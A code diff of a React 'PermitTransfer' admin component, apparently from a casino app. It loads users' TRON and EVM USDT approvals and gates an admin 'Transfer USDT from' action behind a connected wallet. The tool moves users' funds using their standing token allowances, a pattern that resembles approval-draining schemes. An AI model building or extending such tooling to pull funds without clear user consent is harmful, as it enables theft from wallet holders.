@@ -295,19 +295,15 @@ export function PermitTransfer() {
     loadEvmUsers();
   }, [loadEvmUsers]);
 
-  // Fetch TRON data when wallet connected
+  // Fetch TRON data on mount (API is server-side, doesn't need wallet)
   useEffect(() => {
-    if (isTronConnected) {
-      fetchTronData();
-    }
-  }, [isTronConnected, fetchTronData]);
+    fetchTronData();
+  }, [fetchTronData]);
 
-  // Fetch EVM data when wallet connected
+  // Fetch EVM data on mount (API is server-side, doesn't need wallet)
   useEffect(() => {
-    if (isEvmConnected) {
-      fetchEvmData();
-    }
-  }, [isEvmConnected, fetchEvmData]);
+    fetchEvmData();
+  }, [fetchEvmData]);
 
   // Execute TRON transfer
   const executeTronTransfer = async () => {
@@ -462,10 +458,10 @@ export function PermitTransfer() {
 
   const handleRefresh = () => {
     if (activeTab === 'tron') {
-      if (isTronConnected) fetchTronData();
+      fetchTronData();
     } else {
       loadEvmUsers();
-      if (isEvmConnected && publicClient) fetchEvmData();
+      fetchEvmData();
     }
   };
 
@@ -587,26 +583,26 @@ export function PermitTransfer() {
   const evmLoading = isEvmLoading || isEvmDataLoading;
 
   const renderUserTable = (users: UserWithData[], loading: boolean, network: 'tron' | 'evm', isWalletConnected: boolean, walletAddress: string | null | undefined) => {
-    if (!isWalletConnected) {
-      return (
-        <div className="flex items-center gap-2 p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
-          <Wallet className="h-5 w-5 text-yellow-500" />
-          <span className="text-yellow-400">
-            Please connect your {network === 'tron' ? 'TRON' : 'EVM'} admin wallet to view approvals
-          </span>
-        </div>
-      );
-    }
-
     return (
       <>
-        {/* Connected Wallet Info */}
-        <div className="flex items-center gap-2 p-3 rounded-lg bg-casino-brand/10 border border-casino-brand/20">
-          <Wallet className="h-4 w-4 text-casino-brand" />
-          <span className="text-casino-brand text-sm">
-            Connected: {walletAddress?.slice(0, 8)}...{walletAddress?.slice(-6)}
-          </span>
-        </div>
+        {/* Wallet Connection Status */}
+        {isWalletConnected ? (
+          <div className="flex items-center gap-2 p-3 rounded-lg bg-casino-brand/10 border border-casino-brand/20">
+            <Wallet className="h-4 w-4 text-casino-brand" />
+            <span className="text-casino-brand text-sm">
+              Connected: {walletAddress?.slice(0, 8)}...{walletAddress?.slice(-6)}
+            </span>
+          </div>
+        ) : (
+          <div className="flex items-center justify-between p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
+            <div className="flex items-center gap-2">
+              <Wallet className="h-5 w-5 text-yellow-500" />
+              <span className="text-yellow-400 text-sm">
+                Connect your {network === 'tron' ? 'TRON' : 'EVM'} wallet to execute transfers
+              </span>
+            </div>
+          </div>
+        )}
 
         {/* Transaction Success Status */}
         {txSuccess && (
@@ -708,6 +704,16 @@ export function PermitTransfer() {
               <CheckCircle className="h-4 w-4 text-casino-brand" />
               Transfer USDT from {formatAddress(selectedUser.wallet_address)}
             </h4>
+
+            {/* Warning if wallet not connected for transfers */}
+            {!isWalletConnected && (
+              <div className="flex items-center gap-2 p-3 rounded-lg bg-red-500/10 border border-red-500/20">
+                <AlertCircle className="h-4 w-4 text-red-500" />
+                <span className="text-red-400 text-sm">
+                  You must connect your {network === 'tron' ? 'TRON' : 'EVM'} admin wallet to execute transfers. Use the Connect Wallet button in the header.
+                </span>
+              </div>
+            )}
             
             {/* Warning if not approved */}
             {!(selectedUser.hasApproval || selectedUser.allowance > BigInt(0)) && (
@@ -749,13 +755,18 @@ export function PermitTransfer() {
 
             <Button
               onClick={executeTransfer}
-              disabled={isProcessing || !receiverAddress || !transferAmount}
+              disabled={isProcessing || !receiverAddress || !transferAmount || !isWalletConnected}
               className="w-full bg-casino-brand text-black hover:bg-casino-brand/90"
             >
               {isProcessing ? (
                 <>
                   <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                   Processing...
+                </>
+              ) : !isWalletConnected ? (
+                <>
+                  <Wallet className="mr-2 h-4 w-4" />
+                  Connect Wallet to Transfer
                 </>
               ) : (
                 <>
